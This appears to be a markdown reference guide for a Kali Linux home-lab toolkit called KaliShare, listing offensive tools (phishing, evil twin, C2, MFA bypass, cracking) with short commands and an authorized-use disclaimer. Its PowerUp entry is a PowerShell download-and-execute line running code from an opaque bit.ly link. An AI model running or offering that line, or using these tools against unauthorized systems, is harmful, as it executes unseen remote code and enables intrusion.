# KaliShare Bible - Complete Reference Guide
**Version:** 2.0 | **Date:** 2026-03-27

---

## Table of Contents
1. [Overview](#overview)
2. [Tools by Category](#tools-by-category)
3. [New Tools in Kali 2026.1](#new-tools-in-kali-20261)
4. [Essential Commands](#essential-commands)
5. [AI Integration](#ai-integration)
6. [Desktop & Mobile](#desktop--mobile)
7. [Quick Reference](#quick-reference)

---

## Overview

**KaliShare** is a comprehensive Kali Linux home lab solution featuring:
- Bootable USB with 600+ security tools
- AI-powered reconnaissance (Ollama, OpenCode, Claude, Gemini)
- Windows password reset capabilities (Skeleton Key)
- Desktop companion apps for Windows/Android
- Complete CLI with 50+ commands

---

## Tools by Category

### Network Scanning
| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Network discovery & port scanning | `nmap -A target` |
| RustScan | Fast port scanner | `rustscan -a target` |
| Masscan | Internet-scale scanner | `masscan -p1-65535 target` |
| Naabu | Fast port scanner | `naabu -host target` |

### Vulnerability Assessment
| Tool | Purpose | Command |
|------|---------|---------|
| Nuclei | Template-based scanning | `nuclei -u target` |
| NVD | CVE database | `nvd auto` |
| Wapiti | Web vulnerability scanner | `wapiti -u target` |
| Nikto | Web server scanner | `nikto -h target` |

### Web Application
| Tool | Purpose | Command |
|------|---------|---------|
| Burp Suite | Web proxy & testing | `burpsuite` |
| OWASP ZAP | Web app scanner | `zaproxy` |
| SQLMap | SQL injection | `sqlmap -u target` |
| XSStrike | XSS detection | `xsstrike -u target` |

### Password Attacks
| Tool | Purpose | Command |
|------|---------|---------|
| Hashcat | GPU password cracking | `hashcat -m 0 hash wordlist` |
| John | Password cracker | `john --wordlist=pass.txt hash` |
| Hydra | Brute force | `hydra -l user -P pass.txt target ssh` |
| CeWL | Wordlist generator | `cewl -w wordlist.txt target` |

### Wireless
| Tool | Purpose | Command |
|------|---------|---------|
| Aircrack-ng | WiFi auditing | `aircrack-ng capture.cap` |
| Wifite2 | Automated WiFi | `wifite` |
| Fluxion | Evil twin attacks | `fluxion` |
| Eaphammer | WPAEnterprise | `eaphammer` |

### Exploitation
| Tool | Purpose | Command |
|------|---------|---------|
| Metasploit | Exploit framework | `msfconsole` |
| Covenant | C2 framework | `dotnet run --project src/Covenant` |
| Empire | Post-exploitation | `empire` |
| CrackMapExec | Network exploitation | `crackmapexec smb target` |

### Social Engineering
| Tool | Purpose | Command |
|------|---------|---------|
| SET | Social engineering | `setoolkit` |
| Gophish | Phishing framework | `gophish` |
| MFASweep | MFA bypass | `MFASweep.sh` |
| Evilginx2 | MITM phishing | `evilginx` |

### Reconnaissance
| Tool | Purpose | Command |
|------|---------|---------|
| Sublist3r | Subdomain enum | `sublist3r -d target` |
| Amass | Attack surface | `amass enum -d target` |
| TheHarvester | OSINT | `theHarvester -d target` |
| InSpy | LinkedIn enum | `inspy` |

### Post-Exploitation
| Tool | Purpose | Command |
|------|---------|---------|
| PowerUp | Windows privesc | `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/3pZqJl')"` |
| WinPEAS | Windows privesc | `winpeas.exe` |
| LinPEAS | Linux privesc | `./linpeas.sh` |
| LAZYTRAP | Linux privesc | `lazytrap` |

---

## New Tools in Kali 2026.1

Added 8 new tools in March 2026:

1. **AdaptixC2** - Extensible post-exploitation and adversarial emulation framework
2. **Atomic-Operator** - Execute Atomic Red Team tests across multiple OS
3. **Fluxion** - Security auditing and social-engineering research tool
4. **GEF** - Modern experience for GDB with advanced debugging capabilities
5. **MetasploitMCP** - MCP server for Metasploit
6. **SSTImap** - Automatic SSTI detection tool with interactive interface
7. **WPProbe** - Fast WordPress plugin enumeration
8. **XSStrike** - Advanced XSS scanner

---

## Essential Commands

### Network
```bash
# Quick scan
nmap -sV -sC -oA scan target

# Full recon
nmap -p- -A target

# Service detection
rustscan -a target --ulimit 5000
```

### Web
```bash
# Directory busting
gobuster dir -u target -w /usr/share/wordlists/dirb/common.txt

# Parameter discovery
parameth -u target

# CMS detection
whatweb target
```

### Password
```bash
# Hash cracking
hashcat -m 0 hash.txt wordlist.txt

# Rules-based
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
```

### Wireless
```bash
# Handshake capture
airodump-ng -c channel --bssid MAC -w capture wlan0

# Crack
aircrack-ng -w wordlist.txt capture-01.cap
```

---

## AI Integration

### Models (Ollama)
```
 dolphin-llama3:8b-uncensored  # Best uncensored
 mistral:7b                   # 85% benchmark
 qwen3:8b                     # Good code
 phi4:14b                     # Fast, lightweight
```

### MCP Servers
- **Kali MCP** - 25+ security tools via AI
- **MetasploitMCP** - Metasploit automation
- **ProjectDiscovery** - nuclei, httpx, katana

### CLI Commands
```bash
go ollama          # Start Ollama
go opencode       # Start OpenCode
go chat           # AI chat
go gpt            # GPT models
```

---

## Desktop & Mobile

### Windows Desktop
```bash
# GUI launcher
python desktop/kalishare-desktop.py

# SSH connector
python desktop/KaliShare-Connector.py
# Or use: desktop/KaliShare-Connector.bat
```

### Android Mobile
```bash
# Setup
./android/setup-mobile.sh

# Connect via Termux
python android/kalishare-mobile.py
```

---

## Quick Reference

### Aliases (80+)
```bash
source aliases.sh

# Usage
go status         # System status
go wifi-menu      # WiFi tools
go quick 1.1.1.1  # Quick scan
go payload        # Generate payloads
go stealth        # OPSEC mode
go detect         # Detection tracker
go audit          # Run tests
```

### Script Commands
```bash
./cli/go widget           # Interactive TUI
./cli/go essential       # Install tools
./cli/go stealth         # Stealth mode
./cli/go payload         # Generate shells
./cli/go sweep           # Auto network sweep
./cli/go automate        # Workflow hub
./cli/go win-reset       # Windows password reset
```

### Documentation
- `QUICK-REFERENCE.txt` - Quick commands
- `docs/06_REFERENCE/BEST-REPOS.md` - Top 50+ repos
- `docs/06_REFERENCE/HIDDEN-GEMS.md` - Underrated tools
- `docs/06_REFERENCE/VERIFIED-REPOS.md` - Trusted sources
- `docs/06_REFERENCE/AI-MODELS-PARROT-KALI.md` - AI model comparison

---

## Legal Disclaimer

**FOR AUTHORIZED USE ONLY**

This toolkit is for:
- Penetration testing with written authorization
- Security research on systems you own
- Educational purposes in controlled environments

**NOT FOR:**
- Unauthorized access to systems
- Exploiting systems without permission
- Malicious activities

By using this tool, you agree to comply with all applicable laws and regulations.

---

*Last Updated: 2026-03-27 | Kali Linux 2026.1*